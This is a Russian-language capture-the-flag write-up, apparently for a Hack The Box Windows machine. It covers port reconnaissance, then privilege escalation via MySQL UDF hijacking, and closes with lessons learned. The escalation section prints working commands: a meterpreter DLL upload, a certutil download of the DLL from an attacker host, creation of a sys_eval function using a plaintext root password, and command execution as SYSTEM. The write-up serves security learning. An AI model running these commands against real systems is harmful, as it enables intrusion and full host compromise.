## 1. Разведка (Reconnaissance)

```bash

```

**Открытые порты:**
| Порт | Сервис |
|------|--------|
| 135/tcp | Microsoft Windows RPC |
| 3389/tcp | Microsoft Terminal Service (RDP) |
| 5985/tcp | Microsoft HTTPAPI httpd 2.0 (WinRM) |
| 8443/tcp | Microsoft HTTPAPI httpd 2.0 — Nexion DeviceHub |

Порт 8443 — веб-интерфейс **Nexion DeviceHub** (заголовок "Nexion DeviceHub - Login").

## 13. Эксплуатация — MySQL UDF Hijacking

**Загрузка вредоносной DLL:**
```
meterpreter > upload /opt/metasploit/data/exploits/mysql/lib_mysqludf_sys_64.dll "C:\\MySQL\\lib\\plugin\\lib_mysqludf_sys_64.dll"
```

Или через certutil (без Meterpreter):
```powershell
certutil -urlcache -split -f http://10.10.14.82:8001/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
```

**Создание функции `sys_eval`:**
```powershell
& "C:\MySQL\bin\mysql.exe" -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"
```

**Проверка выполнения от SYSTEM:**
```powershell
& "C:\MySQL\bin\mysql.exe" -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('whoami');"
```
```
nt authority\system
```

**Разбор механики:** MySQL, запущенный как служба Windows, по умолчанию работает от `NT AUTHORITY\SYSTEM`. UDF (User-Defined Function) `sys_eval` из загруженной DLL даёт возможность выполнять произвольные shell-команды через SQL-запросы — и так как сама СУБД работает от SYSTEM, выполненные команды получают те же привилегии.

## Ключевые уроки машины

1. **Утечка серийного номера через незащищённый API-эндпоинт** — `/api/status` без аутентификации раскрывает серийник устройства, который по умолчанию является паролем.
2. **Kiosk escape через манипуляцию состоянием оборудования** — намеренно вызванная ошибка сканера (через выключение устройства в панели администрирования) открывает незапланированный путь из "песочницы" киоска в полноценный браузер.
3. **Ctrl+O как universal escape hatch** — диалог "Open File" в большинстве Windows-приложений даёт прямой доступ к проводнику и возможность запустить `cmd.exe`.
4. **Пароли в открытом виде в .bat/.sql файлах** — `refresh-dates.bat` хранил root-пароль MySQL прямым текстом в аргументе командной строки.
5. **MySQL File_priv + writable plugin directory = RCE** — классическая связка для UDF hijacking: если у пользователя есть `FILE` привилегия и каталог `lib/plugin` доступен для записи, можно загрузить вредоносную библиотеку и выполнять системные команды через SQL.
6. **MySQL как служба Windows запускается от SYSTEM** — компрометация СУБД с правами на выполнение UDF-функций напрямую эквивалентна получению SYSTEM на хосте.
7. **Отсутствие SeImpersonatePrivilege не всегда тупик** — когда классические Potato-эксплойты недоступны, стоит искать альтернативные векторы через локальные сервисы (в данном случае — MySQL).
